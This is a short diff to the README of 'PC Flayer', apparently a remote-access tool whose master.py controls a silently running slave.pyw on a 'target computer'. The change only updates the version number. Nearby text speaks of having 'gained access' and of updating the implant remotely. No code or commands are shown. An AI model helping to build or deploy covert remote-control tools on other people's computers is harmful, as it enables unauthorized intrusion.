@@ -28,7 +28,7 @@ Here is a step by step instruction guide on how to operate this program:
 15. And congrats, you've gained access. Now type "help" for a list of available commands.
 
 # Version
-PC Flayer is currently in version 1.1.0, if your master.py is outdated, please download this file as a zip again and use the new one downloaded instead of old one. If slave.pyw is outdated, please follow instructions below how to update slave.pyw without getting out of your seat.
+PC Flayer is currently in version 1.1.3, if your master.py is outdated, please download this file as a zip again and use the new one downloaded instead of old one. If slave.pyw is outdated, please follow instructions below how to update slave.pyw without getting out of your seat.
 
 # Updating slave.pyw on target computer
 Any PC Flayer above version 1.1.2 is able to auto update. Follow this step by step instruction to update slave.pyw without having to modify the file on target computer directly:
